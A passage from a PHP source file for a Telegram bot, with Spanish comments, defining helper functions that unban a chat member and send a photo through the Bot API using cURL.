file_get_contents($url);
}

function unbanChatMember($chatID, $id){
$url = $GLOBALS["website"]."/unbanChatMember?chat_id=".$chatID."&user_id=".$id."";
file_get_contents($url);
}

function sendPhoto($chatID, $photoID, $description = '', $message_id = null) {                                                      $url = $GLOBALS["website"] . "/sendPhoto";

    // Inicializa cURL
    $ch = curl_init();                                          
    // Configura los datos a enviar
    $data = [
	 'chat_id' => $chatID,
        'photo' => $photoID,
        'caption' => $description,
        'parse_mode' => 'HTML',
    ];

    // Añade el ID del mensaje si se proporciona
    if ($message_id) {
        $data['reply_to_message_id'] = $message_id;
    }

    // Configura cURL para enviar una solicitud POST
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Ejecuta la solicitud
    $response = curl_exec($ch);

    // Cierra cURL
    curl_close($ch);

    return $response; // Puedes manejar la respuesta según lo necesites
 }



/*
function sendMessage($chatID, $respuesta) {
        $url = $GLOBALS["website"]."/sendMessage?chat_id=".$chatID."&parse_mode=HTML&text=".urlencode($respuesta);
        file_get_contents($url);
}
*/


?>
